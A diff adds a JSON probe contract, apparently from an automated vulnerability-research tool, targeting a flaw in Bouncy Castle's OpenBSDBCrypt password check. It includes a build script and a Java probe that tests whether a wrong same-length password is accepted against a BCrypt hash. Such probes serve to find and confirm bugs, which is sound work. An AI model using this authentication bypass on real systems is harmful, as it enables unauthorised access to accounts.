@@ -1,0 +1,14 @@
+{
+  "contract_version": "corsair-lite/differential-probe/2",
+  "hypothesis": {
+    "target_file": "crypto/generators/OpenBSDBCrypt.java",
+    "target_symbol": "OpenBSDBCrypt.doCheckPassword",
+    "target_lines": [
+      312
+    ],
+    "root_cause": "doCheckPassword calls indexOf with each loop index and compares the search results, rather than comparing the encoded characters at that index.",
+    "expected_violation": "a deterministic same-length wrong password is accepted for an owned BCrypt hash"
+  },
+  "build_script": "mkdir -p /work/.corsair-java/classes\njavac --release 8 -d /work/.corsair-java/classes /work/crypto/DataLengthException.java /work/crypto/RuntimeCryptoException.java /work/crypto/generators/BCrypt.java /work/crypto/generators/OpenBSDBCrypt.java /work/util/Arrays.java /work/util/Objects.java /work/util/Pack.java /work/util/StringList.java /work/util/Strings.java /work/util/encoders/UTF8.java",
+  "probe": "import org.bouncycastle.crypto.generators.OpenBSDBCrypt;\n\npublic final class CorsairProbe {\n    public static final String CONTROL_PAYLOAD = \"violet-orbit-17\";\n    public static final String EXPLOIT_PAYLOAD = \"untrusted-candidate\";\n\n    private static byte[] salt() {\n        String hex = \"e138bef06f5b0d0a7984c432181ef7fc\";\n        byte[] result = new byte[16];\n        for (int index = 0; index < result.length; index++) {\n            result[index] = (byte)Integer.parseInt(hex.substring(index * 2, index * 2 + 2), 16);\n        }\n        return result;\n    }\n\n    public static boolean runTarget(String payload) {\n        String encoded = OpenBSDBCrypt.generate(CONTROL_PAYLOAD.toCharArray(), salt(), 4);\n        boolean accepted = OpenBSDBCrypt.checkPassword(encoded, payload.toCharArray());\n        return payload.equals(CONTROL_PAYLOAD) ? accepted : !accepted;\n    }\n}\n"
+}
